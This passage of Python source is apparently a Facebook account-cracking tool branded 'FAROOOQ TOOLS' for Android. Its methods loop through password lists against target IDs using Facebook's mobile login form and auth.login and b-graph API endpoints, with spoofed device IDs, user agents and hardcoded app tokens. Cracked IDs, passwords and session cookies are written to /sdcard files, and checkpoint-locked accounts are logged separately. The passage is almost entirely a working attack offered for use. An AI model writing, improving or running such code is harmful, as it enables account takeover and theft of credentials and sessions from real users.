                        'fb_api_req_friendly_name': 'authenticate'
                    }
                    headers = {
                        'User-Agent': user_agent(),
                        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'X-FB-Friendly-Name': 'authenticate',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-FB-HTTP-Engine': 'Liger'
                    }
                    url = "https://api.facebook.com/method/auth.login"
                    po = session.post(url, data=data, headers=headers).text
                    q = json.loads(po)
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        uid = str(q['uid'])
                        if "no" in self.cok:
                            print(f'\r\r{G}[OK] {ids} | {pas}')
                        else:
                            print(f'\r\r{G}[OK] {ids} | {pas} | {coki[:50]}...')
                        open("/sdcard/RANDOM-M3-Ok.txt", "a").write(uid+"|"+pas+"|"+coki+"\n")
                        self.oks.append(uid)
                        break
                    elif 'www.facebook.com' in str(q.get('error_msg', '')):
                        open("/sdcard/RANDOM-M3-Cp.txt", "a").write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop += 1
        except:
            time.sleep(20)
            self.rC(ids)

    def rD(self, ids):
        sys.stdout.write(f"\r {W}[RNDM]-[{self.loop}] M4|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}")
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as ses:
                    pas = self.pwmanager(ids, pw)
                    ua = sexua()
                    p = ses.get("https://m.facebook.com/login.php/")
                    m_ts_match = re.search('name="m_ts" value="(.*?)"', p.text)
                    if m_ts_match:
                        m_ts = m_ts_match.group(1)
                    else:
                        continue
                    __data__ = {
                        'jazoest': re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
                        'lsd': re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
                        'email': ids,
                        'encpass': f"#PWD_BROWSER:0:{m_ts}:{pas}"
                    }
                    __head__ = {
                        'user-agent': ua,
                        'content-type': 'application/x-www-form-urlencoded',
                        'origin': 'https://m.facebook.com',
                        'referer': 'https://m.facebook.com/login.php/'
                    }
                    po = ses.post('https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100', data=__data__, headers=__head__, allow_redirects=False)
                    if "c_user" in ses.cookies.get_dict().keys():
                        coki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                        uid = re.findall('c_user=(.*);', coki)[0]
                        if "no" in self.cok:
                            print(f'\r\r{G}[OK] {uid} | {pas}')
                        else:
                            print(f'\r\r{G}[OK] {uid} | {pas} | {coki[:50]}...')
                        open("/sdcard/RANDOM-M4-Ok.txt", "a").write(uid+"|"+pas+"|"+coki+"\n")
                        self.oks.append(uid)
                        break
                    else:
                        continue
            self.loop += 1
        except:
            time.sleep(20)
            self.rD(ids)

    def rE(self, ids):
        sys.stdout.write(f"\r {W}[RNDM]-[{self.loop}] M5|{G}{len(self.oks)}{W}|{R}{len(self.cps)}{W}")
        sys.stdout.flush()
        try:
            for pw in self.plist:
                with requests.Session() as session:
                    pas = self.pwmanager(ids, pw)
                    data = {
                        'email': ids,
                        'password': pas,
                        'adid': str(uuid.uuid4()),
                        'device_id': str(uuid.uuid4()),
                        'family_device_id': str(uuid.uuid4()),
                        'advertiser_id': str(uuid.uuid4()),
                        'locale': 'en_US',
                        'cpl': 'true',
                        'format': 'json',
                        'credentials_type': 'password',
                        'error_detail_type': 'button_with_disabled',
                        'generate_session_cookies': '1',
                        'generate_analytics_claim': '1',
                        'generate_machine_id': '1',
                        'currently_logged_in_userid': '0',
                        'fb_api_req_friendly_name': 'authenticate',
                        'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'api_key': '882a8490361da98702bf97a021ddc14d',
                        'method': 'auth.login',
                        'jazoest': f'2{sum(ord(char) for char in str(uuid.uuid4()))}'
                    }
                    header = {
                        'User-Agent': user_agent(),
                        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                        'X-FB-HTTP-Engine': 'Liger',
                        'X-FB-Friendly-Name': 'authenticate',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'X-FB-Client-IP': 'True',
                        'X-FB-Server-Cluster': 'True'
                    }
                    url = 'https://b-graph.facebook.com/auth/login'
                    po = session.post(url, data=data, headers=header).text
                    q = json.loads(po)
                    if 'session_key' in q:
                        coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                        uid = str(q['uid'])
                        if "no" in self.cok:
                            print(f'\r\r{G}[OK] {ids} | {pas}')
                        else:
                            print(f'\r\r{G}[OK] {ids} | {pas} | {coki[:50]}...')
                        open("/sdcard/RANDOM-M5-Ok.txt", "a").write(uid+"|"+pas+"|"+coki+"\n")
                        self.oks.append(uid)
                        break
                    elif 'www.facebook.com' in str(q.get('error', {}).get('message', '')):
                        print(f"\r\r{R}[CP] {ids} | {pas}")
                        open("/sdcard/RANDOM-M5-Cp.txt", "a").write(ids+"|"+pas+"\n")
                        self.cps.append(ids)
                        break
                    else:
                        continue
            self.loop += 1
        except:
            time.sleep(20)
            self.rE(ids)

def main():
    clear()
    welcome()
    time.sleep(0.5)
    clear()
    print(logo)
    print()
    print_centered_big("WELCOME TO FAROOOQ TOOLS")
    print()
    print()
    print_box1()
    print()
    print_box2()
    print()
    width = get_terminal_width()
    print(f"{GOLD_LINE}{BOLD}{'=' * min(width - 4, 60)}{RESET}")
    show_prompt()
    print()
    RANDOM()

if __name__ == "__main__":
    main()
